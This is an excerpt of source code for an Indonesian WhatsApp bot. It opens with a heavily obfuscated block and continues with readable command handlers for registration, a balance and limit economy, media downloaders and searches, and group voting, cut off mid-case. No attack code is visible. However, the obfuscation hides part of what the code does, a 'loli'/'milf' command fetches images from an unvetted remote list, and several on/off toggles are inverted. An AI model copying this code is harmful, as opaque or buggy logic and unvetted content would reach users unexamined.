Zeeone[_0x2b6451(-0x20b,-0x18c,-0x142,-0x70,'AMGb')+_0x1330ca(0x50d,0x574,0x5d8,'UJyi',0x6da)+'e'](from,_0xf747f3,image,{'thumbnail':_0xf747f3,'quoted':Ofc,'caption':_0x1330ca(0x56b,0x519,0x594,'y*p]',0x51b)+_0x18cb39(0x498,0x4ac,'o5na',0x556,0x4bb)+_0x599033(-0x62,-0x8a,-0x47,-0xd8,'kVPz')+_0x3632f7('0(dB',0x20b,0x153,0x245,0x1c5)+_0x1330ca(0x52c,0x510,0x590,'nh)N',0x4b2)+'』'+enter+enter+(_0x2b6451(0x198,-0x4b,0x93,0xe0,'17)[')+_0x1330ca(0x770,0x6b4,0x6d8,'gGe6',0x690))+_0x2b4f6a[_0x2b6451(0x44,0xa7,0x68,0x155,'UJyi')]['id']+enter+(_0x18cb39(0x5fa,0x53a,']PAY',0x577,0x4fa)+_0x2b6451(-0x7f,-0x42,-0x118,-0xbd,'UJyi')+_0x3632f7('Xxsw',0x2e2,0x11f,0x21d,0x2d3))+_0x2b4f6a[_0x3632f7('L@Yh',0x1e4,0x169,0x140,0x91)][_0x2b6451(-0x40,-0x186,-0xad,-0x1a6,'17)[')+_0x1330ca(0x654,0x5a6,0x582,'(NJt',0x4aa)]+enter+(_0x2b6451(0xe3,0x90,0x9d,0x66,'o5na')+_0x2b6451(-0x87,-0x1a9,-0xae,-0x153,'zQ&Y')+_0x1330ca(0x6ef,0x74b,0x64e,'#Yln',0x5f2))+_0x2b4f6a[_0x599033(0x122,-0xc0,-0x82,0x33,'DcAw')][_0x2b6451(0xe1,0x4d,0x1f,0xdc,'fd8S')+_0x599033(-0xf7,-0xbb,-0x13e,-0x56,'*&]P')]+enter+(_0x599033(-0x195,-0x1ac,-0xf3,-0x183,'IoZK')+_0x2b6451(-0x12,0x10f,0xb5,0x15d,'L@Yh')+_0x3632f7('Vw%7',0x162,0x145,0x176,0x71)+'\x20')+_0x2b4f6a[_0x1330ca(0x723,0x70c,0x670,'[@o(',0x6b5)][_0x1330ca(0x5cc,0x72f,0x681,'VNC9',0x738)+_0x599033(-0x33,-0xf5,-0x4,-0x13,'*hJO')]+enter+(_0x599033(-0x24c,-0x12d,-0x1a0,-0x193,'Xxsw')+_0x3632f7('DcAw',0x19,0xff,0x62,0x163)+_0x2b6451(-0x12d,-0x37,-0xf5,-0x98,'[um5')+'\x20')+_0x2b4f6a[_0x1330ca(0x6a3,0x62d,0x68a,'ijD7',0x658)][_0x2b6451(-0x6b,-0x15,-0x45,-0x61,'DcAw')+_0x1330ca(0x741,0x636,0x643,'fd8S',0x680)]+enter+(_0x1330ca(0x664,0x5a5,0x625,'zQ&Y',0x6c5)+_0x1330ca(0x5c9,0x51b,0x58f,'DcAw',0x531)+_0x2b6451(-0x8,-0x93,-0x23,-0xc,'OEuv')+_0x18cb39(0x467,0x435,'kVPz',0x497,0x3b4)+_0x3632f7('*hJO',0x192,0x199,0xa1,0x92)+_0x599033(0x105,0xdb,0xf6,0x30,'XoX9')+_0x599033(-0x21b,-0x1b4,-0x90,-0x123,'nh)N'))+_0x2b4f6a[_0x18cb39(0x641,0x68c,'[um5',0x5ed,0x561)][_0x18cb39(0x608,0x6c2,'acSs',0x5d3,0x656)+_0x599033(0x6c,0x9b,0x77,-0x60,'72ZG')]+enter+(_0x18cb39(0x408,0x49e,'#TxB',0x4af,0x3b3)+_0x18cb39(0x523,0x617,'UJyi',0x525,0x590)+'*\x20')+_0x2b4f6a[_0x599033(-0xce,-0xe2,-0xd2,-0xb,'phS$')+'s'][_0x3632f7(']PAY',0x2a1,0x287,0x243,0x15d)+'h']+(_0x3632f7('Q^1[',0x6e,0x2d,0x10d,0xae)+'a')+enter+enter+(_0x2b6451(-0xd8,-0x122,-0x106,-0x1b9,'lXVw')+_0x599033(-0xa4,-0x15,-0x16a,-0x82,'mRLu')+_0x599033(0x2a,-0x92,-0x15d,-0x74,'2PQI')+_0x18cb39(0x683,0x602,'nh)N',0x64b,0x703)+_0x599033(-0x263,-0x208,-0x151,-0x19f,'mRLu')+_0x3632f7(']PAY',0xb7,0x3e,0x122,0x212)+_0x18cb39(0x69c,0x5eb,'pogp',0x634,0x738)+_0x1330ca(0x7b2,0x742,0x72d,'[@o(',0x75a)+'_')});for(let _0x5b101c of _0x2b4f6a[_0x2b6451(0x78,0xe3,0x61,0x144,'DcAw')+'s']){if(_0x5b101c[_0x599033(-0xba,-0x115,-0x139,-0x128,'y*p]')][_0x1330ca(0x581,0x660,0x63a,'*qfs',0x687)+_0x2b6451(-0x1af,-0xc3,-0x11e,-0x1eb,']9]r')](_0x235f00[_0x2b6451(-0x20,0x2c,0xa0,0xa2,'QdN5')])){let _0x1d5f71=await _0x235f00[_0x18cb39(0x593,0x4ef,'Q^1[',0x516,0x4b0)](getBuffer,_0x5b101c[_0x1330ca(0x516,0x4af,0x5b0,'o5na',0x4ef)]);Zeeone[_0x3632f7('nh)N',0x219,0x1f1,0x144,0x1f3)+_0x3632f7('[gM^',0x213,0xfe,0x1cf,0x233)+'e'](from,_0x1d5f71,video,{'thumbnail':Buffer[_0x18cb39(0x45e,0x522,'#Yln',0x4f6,0x5b3)](-0x6*-0x326+0x1*-0x1a6b+-0x29*-0x2f),'quoted':Ofc,'caption':_0x1330ca(0x542,0x681,0x5b6,'0(dB',0x5ee)+_0x3632f7('VNC9',0x102,-0xa,0x5c,0x58)+_0x3632f7(']PAY',0x18a,0x1e7,0x10e,0x31)+_0x5b101c[_0x1330ca(0x6ca,0x586,0x672,'[um5',0x6de)]});}else{let _0x5a14a9=await _0x235f00[_0x599033(-0x7b,-0xa8,-0x32,-0x12c,'2PQI')](getBuffer,_0x5b101c[_0x1330ca(0x49c,0x5bb,0x59d,'17)[',0x5ef)]);Zeeone[_0x599033(-0x1bb,-0x39,-0xb0,-0xf6,'0(dB')+_0x18cb39(0x5be,0x471,'L@Yh',0x518,0x581)+'e'](from,_0x5a14a9,image,{'thumbnail':Buffer[_0x3632f7('jyzu',0x13d,0x67,0xcf,0x12d)](0x2*-0xc0+-0x832*0x4+-0x2*-0x1124),'quoted':Ofc,'caption':_0x18cb39(0x5b2,0x6ec,'pogp',0x615,0x6c5)+_0x18cb39(0x4a9,0x5d4,'Vw%7',0x588,0x525)+'•\x20'+_0x5b101c[_0x2b6451(0x149,0xa,0x6f,0x14b,'fd8S')]});}}})[_0x322d85(0x157,'72ZG',0x19e,0x1eb,0x239)](_0x5da750=>reply(_0x10d1cf(0x2ed,'*hJO',0x3e9,0x30f,0x39f)+_0x10d1cf(0x2b7,'kVPz',0x205,0x293,0x21d)+_0x238807('OEuv',0x262,0x223,0x2a5,0x21c)+_0x238807('(NJt',0x2f6,0x38f,0x346,0x2b7)+_0x10d1cf(0x238,'17)[',0xc5,0x13a,0x213)+_0x4338be(-0xa8,'nh)N',-0x24b,-0x173,-0x147)+_0x238807('kNYm',0x19b,0x25f,0x268,0x27d)+_0x10d1cf(0x194,'phS$',0x23a,0x16b,0xac)+'te'));break;case _0x238807('DcAw',0x2a6,0x399,0x1ca,0x2ad)+'nu':case _0x322d85(0x1c9,'pogp',0x1a4,0x1ba,0x27e):case _0x2dfcd2('zQ&Y',0x12c,0x14a,0xfe,0x73):ihsh=owner_number+(_0x2dfcd2('pogp',0x250,0x298,0x213,0x1e0)+_0x10d1cf(0xad,'17)[',0x26e,0x1a1,0xe9)+_0x238807('#TxB',0x48f,0x43b,0x432,0x408));let cekvipp=ms(premium[_0x238807('NM[Q',0x1f0,0x180,0x1c0,0x21f)+_0x2dfcd2('kNYm',0x28d,0x1c5,0x28d,0x379)+_0x2dfcd2('kNYm',0x29c,0x343,0x392,0x2d2)+'ed'](sender,premium)-Date[_0x10d1cf(0x3ad,'OEuv',0x2b4,0x2d8,0x1e8)]());const _0x337401={};_0x337401[_0x4338be(-0xeb,'L@Yh',-0x86,-0x5c,0x29)+_0x2dfcd2('gGe6',0x263,0x22d,0x1c9,0x2f1)+'t']=_0x238807('#Yln',0x347,0x245,0x268,0x333)+_0x322d85(0x60,'jyzu',0xb8,0x13f,-0x17)+'C';const _0x46069a={};_0x46069a[_0x322d85(-0x2b,'*hJO',0x79,0xd0,-0x5f)+_0x2dfcd2('#TxB',0x10d,0x1ef,0x3b,0x1bd)]=_0x2dfcd2('*&]P',0xc0,0x24,-0x24,-0x1e)+'t',_0x46069a[_0x238807('*hJO',0x243,0x389,0x2dd,0x2eb)+_0x238807('Z*H*',0x205,0x322,0x2aa,0x2a6)]=_0x337401,_0x46069a[_0x10d1cf(0x13d,'2PQI',0x67,0x12d,0x182)]=_0x238807('AMGb',0x326,0x2ae,0x17d,0x24c)+_0x2dfcd2('pogp',0x203,0x263,0x2e7,0x156);const _0x30e427={};_0x30e427[_0x2dfcd2('L@Yh',0x1fb,0x2bf,0x24b,0x212)+_0x4338be(-0x8a,']PAY',-0x2a,0x43,0xe7)+'t']=_0x4338be(-0x25,'acSs',-0x18d,-0xb2,-0x126)+_0x238807('*hJO',0x2f3,0x27d,0x1d6,0x2d0);const _0x1c34a3={};_0x1c34a3[_0x322d85(0xcf,'jyzu',0x130,0x50,0x177)+_0x322d85(0xa8,'o5na',0x102,0x5b,0x41)]=_0x238807('Xxsw',0x40b,0x392,0x377,0x341),_0x1c34a3[_0x2dfcd2('mRLu',0xb6,0xd0,0x1a4,0xc7)+_0x238807('2PQI',0x376,0x246,0x2c3,0x2d7)]=_0x30e427,_0x1c34a3[_0x322d85(-0x4b,'NM[Q',-0x4,-0x87,0xf4)]=_0x2dfcd2('gGe6',0x9e,0x9e,-0xe,0x174)+_0x4338be(-0x145,'Vw%7',-0x75,-0x40,0x30);const _0x5a0c72={};_0x5a0c72[_0x4338be(-0x151,'gGe6',0x29,-0x83,-0x12c)+_0x4338be(0x8b,'AMGb',0x67,0x30,0x7a)+'t']=_0x238807('jyzu',0x3c7,0x293,0x2f6,0x36d)+_0x2dfcd2('[gM^',0xda,0x10e,0xcf,0x33);const _0x5626d5={};_0x5626d5[_0x10d1cf(0x1e4,'AMGb',0x219,0x2d2,0x2e7)+_0x4338be(-0x35,'Q^1[',-0x117,-0xf9,-0x177)]=_0x4338be(0x48,']PAY',0xcc,-0x2c,-0x19)+'ot',_0x5626d5[_0x322d85(-0x3c,'[gM^',0xb6,0x162,-0x29)+_0x10d1cf(0x3de,'xN#E',0x2b0,0x327,0x2f5)]=_0x5a0c72,_0x5626d5[_0x238807('#TxB',0x26f,0x272,0x2b1,0x2aa)]=_0x4338be(-0xe0,'kNYm',-0x163,-0x133,-0x167)+_0x238807('*&]P',0x293,0x26b,0x26d,0x232);let gaklo=[_0x46069a,_0x1c34a3,_0x5626d5];if(menusimple==![])sendButDoc(from,menubot[_0x2dfcd2('Q^1[',0x1fa,0x29b,0x227,0x273)+'nu'](pushname,sender,isOwner,isPremium,cekvipp,getLimit,limitawal,limit,balance,getBalance,simbolnya,petik,prefix),_0x322d85(0x13d,'Q^1[',0x1a1,0x106,0x12e)+_0x2dfcd2('[um5',0x11a,0xa3,0x20f,0xe6)+':\x20'+hitall+enter+(_0x322d85(0x49,'(NJt',0xe9,0x1b,0x69)+_0x322d85(-0x57,'OEuv',-0x12,-0x25,-0xb0)+':\x20')+hit_today[_0x322d85(0x1b6,'Vw%7',0x174,0x13b,0x1b6)+'h']+enter+enter+namabot+(_0x238807('IoZK',0x47e,0x343,0x2f6,0x3ce)+_0x10d1cf(0x285,']PAY',0x29e,0x306,0x350)+_0x4338be(-0xa6,'72ZG',0x75,-0x44,0x4e)+_0x322d85(0x19f,'*hJO',0x108,0xad,0x8b)+_0x2dfcd2('IoZK',0x198,0xe2,0x103,0x23e)),gaklo,{'contextInfo':{'forwardingScore':0x3b9aca00,'isForwarded':!![],'sendEphemeral':!![],'mentionedJid':[sender],'externalAdReply':{'mediaUrl':_0x10d1cf(0x2f0,'xN#E',0x28a,0x2c6,0x296)+_0x10d1cf(0x1c8,'2PQI',0x37b,0x285,0x303)+_0x2dfcd2('jyzu',0x285,0x256,0x268,0x212)+_0x238807('o5na',0x2d7,0x4a7,0x421,0x3a7)+_0x238807('mRLu',0x3d7,0x29e,0x3c5,0x30a)+_0x4338be(0x4f,'zQ&Y',0x83,-0x27,0xc5),'mediaType':0x2,'title':''+ucapannya,'body':namabot+_0x4338be(-0x16d,'NM[Q',-0x178,-0x151,-0xe9)+owner_name+'\x20','thumbnailUrl':'','thumbnail':pp_userz}},'quoted':ftroli});else(menusimple=!![])&&sendButLocation(from,menubot[_0x2dfcd2('fd8S',0x10c,0x1ba,0x17,0x48)+'nu'](pushname,sender,isOwner,isPremium,cekvipp,getLimit,limitawal,limit,balance,getBalance,simbolnya,petik,prefix),_0x322d85(0xc6,'*&]P',0xa6,0x85,0x145)+_0x10d1cf(0x196,'fd8S',0x142,0x1dd,0x194)+':\x20'+hitall+enter+(_0x2dfcd2('lXVw',0x20c,0x20f,0x160,0x26d)+_0x10d1cf(0x2da,'acSs',0x2e3,0x313,0x2ad)+':\x20')+hit_today[_0x238807('0(dB',0x306,0x283,0x1ee,0x2c5)+'h']+enter+enter+namabot+_0x10d1cf(0x38e,'#Yln',0x214,0x291,0x23a)+owner_name,thumbnail,gaklo,{'contextInfo':{'mentionedJid':[sender]}});break;}
					switch (command) {
							case 'setmenu':
										if (!isOwner && !isCreator && !Ofc.key.fromMe) return reply(mess.only.owner)
										if (args.length < 1) return reply(`*Example :*${enter} •${prefix + command} simple\n  for simple menu\n${enter} •${prefix + command} ori\n  for real menu`)
										if ((args[0]) == 'ori'){
											menusimple = false
											reply(`_Succses mengganti menu ke menu ori_`)
											} else if((args[0]) == 'simple'){
												menusimple = true
												Mloc = false
												reply(`_Succses mengganti menu ke menu simple_`)
												} else {
													reply(`*Example :*${enter} •${prefix + command} simple\n  for simple menu\n${enter} •${prefix + command} ori\n  for real menu`)
												}
										break
							case 'verify': case 'daftar':
										if (isUser) return reply('Kamu sudah terdaftar di dalam database')
										addRegisterUser(sender, pushname, bio_user, wib)
										let ran_blc = randomNomor(50)
										addBalance(sender, ran_blc, balance)
										fs.writeFileSync('./database/user.json', JSON.stringify(_user))
										teks = `╭─❒ *Verification* ❒\n│📛 *Nama :* ${pushname}\n│#️⃣ *Nomor :* @${sender.split('@')[0]}\n│💌 *Bio :* ${bio_user}\n│⏰ *Time :* ${wib} Wib\n╰❒ *Success*`
										let papako = [{
											"buttonId": `menu`,
											"buttonText": {
												"displayText": "MENU"
												},
												"type": "RESPONSE"
												},{
													"buttonId": `me`,
													"buttonText": {
														"displayText": "PROCFILE"
														},
														"type": "RESPONSE"
													}]
											sendButLocation(from, teks , `Thank for verification 💋\n${namabot}™© | By ${owner_name}`, thumbnail, papako, {contextInfo: { mentionedJid: [sender]}})
									break
						case 'autoregis': case 'register':
									if (!Ofc.key.fromMe && !isOwner && !isCreator) return reply(mess.only.owner)
									if (args[0] === "on") {
										if (autoregister === true) return reply(`Mode ${command} telah aktif sebelumnya`)
										autoregister = true
										reply(`${command} di aktifkan`)
										} else if (args[0] === "off") {
											if (autoregister === false) return
											autoregister = false
											reply(`${command} telah dinonaktifkan`)
											} else if (!q) {
												sendButMessage(from, `MODE AUTO REGISTER`, `Choose one`, [
												{
													buttonId: 'register on',
													buttonText: {
														displayText: `On`,
														},
														type: 1,
														},
														{
															buttonId: 'register off',
															buttonText: {
																displayText: `Off`,
																},
																type: 1,
																},
																]);
															}
									break;
						case 'autorespon': case 'autorespond':
									if (!isOwner && !isCreator && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (q === 'on'){
										if (autorespon === true) return reply(`${command} telah aktif sebelumnya`)
										autorespon = false
										reply(`${command} di aktifkan`)
										} else if (q === 'off'){
											if (autorespon === false) return
											autorespon = true
											reply(`${command} telah dinonaktifkan`)
											} else if (!q) {
												sendButMessage(from, `MODE AUTO RESPON`, `Choose one`, [
												{
													buttonId: 'autorespon on',
													buttonText: {
														displayText: `On`,
														},
														type: 1,
														},
														{
															buttonId: 'autorespon off',
															buttonText: {
																displayText: `Off`,
																},
																type: 1,
																},
																]);
															}
									break;
						case 'public':
									if (!Ofc.key.fromMe && !isOwner) return reply(mess.only.owner)
									if (public_mode === false) return
									public_mode = false
									sendButMessage(from, `『 *PUBLIC-MODE* 』`, `Click self to return to self mode`, [
									{
										buttonId: `self`,
										buttonText: {
											displayText: `Self Mode`,
											},
											type: 1,
											}]);
									break;
						case 'self':
									if (!Ofc.key.fromMe && !isOwner) return reply(mess.only.owner)
									if (public_mode === true) return
									public_mode = true
									sendButMessage(from, `『 *SELF-MODE* 』`, `Click public to return to public mode`, [
									{
										buttonId: `public`,
										buttonText: {
											displayText: `Public Mode`,
											},
											type: 1,
											}]);
									break;
						case 'topbalance':
									if(!isGroup)return reply(mess.only.group)
									let txot = `*── 『 TOP BALANCE 』 ──*\n\n`
									let mebn = [];
									for (let i of balance){
										mebn.push(i.id)
										let bl = (i.balance)
										txot += `🆔 *ID :* @${i.id.split("@")[0]}\n💹 *Balance :* ${bl}\n\n`
										}
									mentions(txot, mebn, true)
									break
						case 'toplimit':{
									if(!isGroup)return reply(mess.only.group)
									let txot = `*── 『 TOP  LIMIT 』 ──*\n\n`
									let mebn = [];
									for (let i of limit){
										mebn.push(i.id)
										let bl = (i.limit)
										txot += `🆔 *ID :* @${i.id.split("@")[0]}\n📊 *Limit :* ${bl}\n\n`
									}
									mentions(txot, mebn, true)
									}
									break
						case 'bal': case 'limit': case 'ceklimit': case 'balance': 
									reply(`*${ucapannya} @${sender.split("@")[0]}* 

*🌐 Limit : ${isPremium ? 'Unlimited Premium' : `${getLimit(sender, limitawal, limit)} / ${limitawal}`}*
*💹 Balance : $${getBalance(sender, balance)}*


Kamu Dapat Membeli Limit Dengan ${prefix}Buylimit *Nominal*

*Example :*
${prefix}buylimit 10

NOTE : 
- Harga Limit Perlimit adalah $100 balance`)
									break
						case 'level':{
									reply(`@${sender.split("@")[0]}

*📊 Level : ${getLevelingLevel(sender)}*
*🎯 Xp : ${getLevelingXp(sender)}*`)
}
									break
						case 'giftlimit': case 'givelimit':
									if (isPremium) return reply(`User Premium Tidak Bisa Melakukan Gift Limit Lord`)
									if (!isGroup) return reply(mess.only.group)
									if (!q.includes('|')) return  reply(`Contoh ${prefix + command} _@user | Nominal_`)
									const tujuan = q.substring(0, q.indexOf('|') - 1)
									const jumblah = q.substring(q.lastIndexOf('|') + 1)
									if(isNaN(jumblah)) return await reply('Jumlah Harus Berupa Angka Lord')
									if (jumblah < 1 ) return reply(`minimal transfer 1`)
									if (getLimit(sender, limitawal, limit) < jumblah) return reply(`Limit Mu Tidak Mencukupi Untuk Melakukan Gift Limit`)
									const tujuantf = `${tujuan.replace("@","")}@s.whatsapp.net`
									hasiltf = jumblah
									giveLimit(tujuantf, hasiltf, limit)
									beliprem(sender, jumblah)
									reply(`─ 『 *SUKSES* 』 ─

SUKSES TRANSFER LIMIT

🆔 *Pengirim :* @${sender.split("@")[0]}
📛 *Penerima :* ${tujuan}
💹 *Jumlah Limit :* ${jumblah}

Example : 
${prefix}giftlimit @user | 10 

*NOTE :*
Pastikan Transfer Limit Benar`)
									break 
						case 'buyprem': case 'beliprem':
									if (isPremium) return reply('Loe Dah Prem Cuy')
									if (getLimit(sender, limitawal, limit) < 1000) return reply(`Limitmu Tidak Cukup.\nDi Perlukan 1000 Limit Untuk Menjadi User Premium Trial 3 Hari`)
									premium.addPremiumUser(`${sender}`, `3d`, premium)
									sendButMessage(from, `*Sekarang Akun Anda Telah Premium*`, `Klik Untuk Mengecek Waktu Expired`, [
									{
										buttonId: `cekprem`,
										buttonText: {
											displayText: `🔖 CEK PREMIUM`,
											},
											type: 1,
											}]);
									beliprem(sender, 1000)
									break
						case 'buylimit':{
									if (!q) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $100 balance`)
									if (q.includes('-')) return reply(`Jangan menggunakan -`)
									if (isNaN(q)) return reply(`Harus berupa angka`)
									let ane = Number(nebal(q) * 100)
									if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
									kurangBalance(sender, ane, balance)
									giveLimit(sender, nebal(q), limit)
									reply(`Pembeliaan limit sebanyak ${q} berhasil

*📊 Sisa Balance : ${getBalance(sender, balance)}*
*💹 Sisa Limit : ${getLimit(sender, limitawal, limit)} / ${limitawal}*`)
}
									break
						case 'playstore': 
									if(!q) return reply('Mau cari apa lord')
									reply(mess.wait)
									let play = await hx.playstore(q)
									let store = `*『 PLAY STORE 』*\n\n*Hasil Pencarian Dari : ${q}*`
									for (let i of play){
										store += `
🆔 *Nama* : ${i.name}
🎯 *Link* : ${i.link}\n
👨‍💻 *Dev* : ${i.developer}
🌝 *Link Dev* : ${i.link_dev}
`
}
									reply(store)
									break
						case 'brainly':
									if(!q) return reply('Mau cari apa lord')
									brainly(`${q}`).then(res => {
										teks = `─ 『 *BRAINLY* 』 ─\n\n*Hasil Pencarian Dari ${q}*\n\n`
										for (let Y of res.data) {
											teks += `🔖 *PERTANYAAN :* ${Y.pertanyaan}\n💬 *JAWABAN :* ${Y.jawaban[0].text}\n\n`
											}
											Zeeone.sendMessage(from, teks, text, {quoted: Ofc, detectLinks: false})
										})
									break
						case 'mediafire':
									if (!isPremium) return reply(mess.only.prem)
									if (args.length < 1) return reply('Masukkan link mediafire')
									if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply('Linknya Error')
									reply(mess.wait)
									teks = args.join(' ')
									res = await mediafireDl(teks)
									result = ` *MEDIAFIRE DOWNLOAD*

*Data Berhasil Didapatkan!*

🆔 Nama : ${res[0].nama}
📊 Ukuran : ${res[0].size}
💬 Link : ${res[0].link}

_Tunggu Proses Upload Media_`
									reply(result)
									sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: Ofc})
									break
						case 'tiktoknowm':   case 'tiktok':
                                                                        if (!q) return reply('Linknya?')
									
									if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Invalid link')
									let nowem = q
									hx.ttdownloader(nowem)
									.then(result => {
										const { wm, nowm, audio } = result
										axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
										.then(async (a) => {
                                                                                        let meno = await getBuffer(nowm)
											me = `*Link* : ${a.data}`
											Zeeone.sendMessage(from,meno,MessageType.video,{mimetype:'video/mp4',quoted: Ofc, caption:me})
											})
										}).catch((err) => reply(`Link tidak valid`))
									break 
						case 'tiktokmusic': case 'tiktokaudio':  
                                                                        if (!q) return reply('Linknya?')
									if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Invalid Link')
									
									let audi = q
									hx.ttdownloader(audi)
									.then(result => {
										const { wm, nowm, audio } = result
										axios.get(`https://tinyurl.com/api-create.php?url=${audio}`)
										.then(async (a) => {
                                                                                 let audin = await getBuffer(audio)
											Zeeone.sendMessage(from,audin,MessageType.audio,{mimetype:'audio/mp4',quoted: Ofc})
											})
										}).catch((err) => reply(`Link tidak valid`))
									break
						case 'playvideo': case 'playmp4': case 'ytmp4': case 'ytvideo':{
									if (!q) return reply(`Example : ${prefix+command} query`)
									reply(mess.wait)
									try {
										let yut = await yts(q)
										ytv(yut.videos[0].url)
										.then((res) => {
											const { dl_link, thumb, title, filesizeF, filesize } = res
											axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
											.then((a) => {
												if (Number(filesize) >= 40000) return Zeeone.sendMessage(from, `*─ 『 YOUTUBE VIDEO 』─*\n\n*▢ Title :* ${title}\n*▢ Filesize :* ${filesizeF}\n*▢ Upload :* ${yut.videos[0].ago}\n*▢ Ditonton :* ${yut.videos[0].views}\n*▢ Duration :* ${yut.videos[0].timestamp}\n\n\`\`\`Ukuran File Terlalu Besar Jadi Di Sajikan Dalam Bentuk Link\`\`\``, text, {quoted : Ofc})
												Zeeone.sendMessage(from, thumb, image, {caption: `─ 『 YOUTUBE VIDEO 』─\n\n*▢ Title :* ${title}\n*▢ Filesize :* ${filesizeF}\n*▢ Upload :* ${yut.videos[0].ago}\n*▢ Ditonton :* ${yut.videos[0].views}\n*▢ Duration :* ${yut.videos[0].timestamp}\n*▢ LINK :* ${yut.videos[0].url}\n\n\`\`\`Tunggu Sebentar, Video Sedang Dikirim\`\`\``, quoted : Ofc})
												sendFileFromUrl(dl_link, video, {mimetype: 'video/mp4',quoted:Ofc})
												})
												})
												} catch (err) {
													console.log('Error : %s', color(err, 'red'))
													reply(`ERROR`)
												}
											}
									break
						case 'play': case 'ytmp3':
									if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
									var srch = args.join(' ')
									aramas = await yts(srch);
									aramat = aramas.all 
									var mulaikah = aramat[0].url
									try {
										yta(mulaikah)
										.then((res) => {
											const { dl_link, thumb, title, filesizeF, filesize } = res
											axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
											.then(async (a) => {
												if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
												const captions = `🎧 *PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
												await sendMediaURL(from, thumb, captions)
												sendMediaURL(from, dl_link).catch(() => reply('error'))
												}) 
											})
										} catch (err) {
											reply('Terjadi kesalahan')
											}
									break
						case 'yts': case 'youtubesearch': case 'ytsearch':{
									if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* _query_`)
									reply(mess.wait)
									yts(q)
									.then((res) => {
										let yt = res.videos
										let txt = `─ 『 *YOUTUBE SEARCH* 』 ─\n\n*Hasil Pencarian : ${q}*\n`
										l = 1
										for (let i = 0; i < 15; i++){
											txt += `\n${l++}.📛 *Judul :* ${yt[i].title}\n🆔 *Id :* ${yt[i].videoId}\n💢 *Upload :* ${yt[i].ago}\n👁️‍🗨️ *Ditonton :* ${yt[i].views}\n💢 *Duration :* ${yt[i].timestamp}\n🔗 *Url :* ${yt[i].url}\n___________________\n`
											}
											sendFileFromUrl(yt[0].image, image, {caption: txt, quoted:Ofc})
										})
										.catch((err) => {
											console.log(color('[YT SEARCH]', 'red'), err)
											reply(mess.error)
											})
										}
									break
						case 'wiki': case 'wikipedia':
									if (args.length < 1) return reply(' Yang Mau Di Cari Apa Lord? ')
									reply(mess.wait)
									teks = args.join(' ')
									res = await wikiSearch(teks).catch(e => {
										return reply('Error Hasil Tidak Ditemukan') 
										}) 
										result = `*JUDUL :* ${res[0].judul}\n*WIKI :* ${res[0].wiki}`
										sendFileFromUrl(res[0].thumb, image, {quoted: Ofc, caption: result}).catch(e => {
											reply(result)
										})
									break
						case 'pinterest': case 'pin':
									if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* _query_`)
									reply(mess.wait)
									let pin = await hx.pinterest(q)
									let ac = pin[Math.floor(Math.random() * pin.length)]
									let di = await getBuffer(ac)
									await Zeeone.sendMessage(from,di,image,{thumbnail: thumbnail, quoted: Ofc})
									break
						case 'waifu': case 'loli': case 'husbu': case 'milf': case 'cosplay': case 'wallml':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									reply(mess.wait)
									let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
									let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
									Zeeone.sendMessage(from, wipi, image, {quoted: Ofc})
									limitAdd(sender, limit)
									break
						case 'asupan':{
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									reply(mess.wait)
									data = fs.readFileSync('./lib/asupan.js');
									jsonData = JSON.parse(data);
									randIndex = Math.floor(Math.random() * jsonData.length);
									randKey = jsonData[randIndex];
									p = await getBuffer(randKey.result)
									Zeeone.sendMessage(from, p, video, { quoted:  Ofc, mimetype: 'video/mp4', caption: 'Asupan Lord'})
									limitAdd(sender, limit)
									}
									break
						case 'delete': case 'del': case 'd':
									if (!Ofc.key.fromMe && !isGroupAdmins && !isOwner)return reply(mess.only.admin)
									if (!isQuotedReply) return reply(`Reply pesan dari bot!!`)
									Zeeone.deleteMessage(from, { id: Ofc.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
									break
						case 'afk':
									if (!isGroup) return reply(mess.only.group)
									if (isAfkOn) return reply('Kamu dalam mode afk Lord')
									let reason = body.slice(5) ? body.slice(5) : 'Nothing.'
									afk.addAfkUser(sender, Date.now(), reason, _afk)
									mentions(`─『 *AFK MODE* 』─

@${sender.split('@')[0]} sedang afk!
Alasan : ${reason}`, [sender], true)
									break
						case 'delvote': case 'dellvote':
									if (!Ofc.key.fromMe && !isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isVote) return reply('Tidak ada sesi Voting')
									delVote(from)
									reply('Sukses Menghapus sesi Voting Di Grup Ini')
									break
						case 'voting': case 'vote':
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isGroup) return reply(mess.only.group)
									if (isVote) return reply('Sesi Voting Sedang Berlangsung Di Grup Ini')
									if (!q) return reply(`*Example :*\n ${prefix + command} @tag target | reason| 1 (1 = 1 Menit)`)
									if (Ofc.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || Ofc.message.extendedTextMessage.contextInfo == null) {
										let id = Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]
										split = args.join(' ').replace('@', '').split('|')
										if(!Number(split[2])) return reply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
